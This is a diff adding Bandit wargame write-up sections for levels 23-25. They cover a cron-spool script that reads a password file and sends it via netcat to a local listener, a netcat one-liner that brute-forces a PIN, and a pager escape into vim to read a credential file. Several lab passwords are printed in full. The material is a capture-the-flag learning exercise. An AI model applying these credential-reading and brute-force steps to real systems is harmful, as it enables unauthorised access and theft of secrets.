@@ -388,4 +388,81 @@ bandit22@melinda:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
 bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+``
+
+## Level 23
 ```
+bandit23@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+```
+As we can see, cron is running scripts and then deleting them. So we have to make him read the password for us. We're going to grab it with netcat.
+In `/var/spool/bandit24` create small script looking somewhat like this:
+```
+#!/bin/bash
+nc localhost 12345 < /etc/bandit_pass/bandit24
+```
+Don't forget to make it executable!
+Start listening on other terminal
+```
+bandit23@melinda:~$ nc -l -p 12345
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+## Level 24
+This time, we're going to build a pretty nice one-liner to solve this task.
+Let's begin by creating a list of pincodes with `seq -w 9999`, then prepend all lines with password to this level with `sed 's/^/UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ /'` and pipe it to server using `nc localhost 30002`. To extract the password, append `sort | uniq`.
+
+```
+bandit24@melinda$ seq -w 9999 | sed 's/^/UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ /' | nc localhost 30002 | sort | uniq
+
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+Wrong! Please enter the correct pincode. Try again.
+```
+
+# Level 25
+Logging in should be fairly easy, because we were given the private key to log in.
+```
+bandit25@melinda:~$ ls
+bandit26.sshkey
+```
+However, when trying to log in, `bandit26` is printed and we get disconnected.
+Let's check `/etc/passwd` to find out which shell is `bandit26` using and analyze it.
+```
+bandit25@melinda:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@melinda:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+more ~/text.txt
+exit 0
+```
+To avoid exiting `more`, resize terminal to just a few lines. Reading man pages, reveals that `v` key will launch deafult text editor(vim). To read password type `:e /etc/bandit_pass/bandit26`. The password is `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`.
+
+FIN
+
